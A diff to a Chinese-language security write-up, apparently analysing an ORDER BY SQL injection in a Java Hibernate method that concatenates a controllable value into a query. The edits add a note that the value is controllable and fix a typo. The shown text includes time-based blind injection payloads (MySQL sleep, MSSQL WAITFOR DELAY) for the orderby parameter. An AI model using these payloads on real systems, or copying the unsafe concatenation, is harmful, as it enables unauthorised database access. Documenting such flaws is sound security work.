@@ -464,7 +464,7 @@ public Page listUse(RequestContext requestContext) throws Exception {
     }
 }
 ```
-在getUseSQLQuery方法中，sql的拼接省略如下。也就是sql命令`select something from order by xxx desc`。
+在getUseSQLQuery方法中，sql的拼接省略如下。也就是sql命令`select something from order by xxx desc`。其中`xxx`是可控的
 ```java
 private SQLQuery getUseSQLQuery(RequestContext requestContext) {
     String sql = "select * from ";
@@ -482,7 +482,7 @@ private SQLQuery getUseSQLQuery(RequestContext requestContext) {
     SQLQuery sqlQuery = this.getBaseDao().getHibernateSession().createSQLQuery(sql);
 }
 ```
-orderby参数注入的一些payliad
+orderby参数注入的一些payload
 ```
 orderby=1 and (select 8320 from(select select(sleep(5)))JcSn)
 orderby=1;WAITFOR DELAY '0:0:5'--
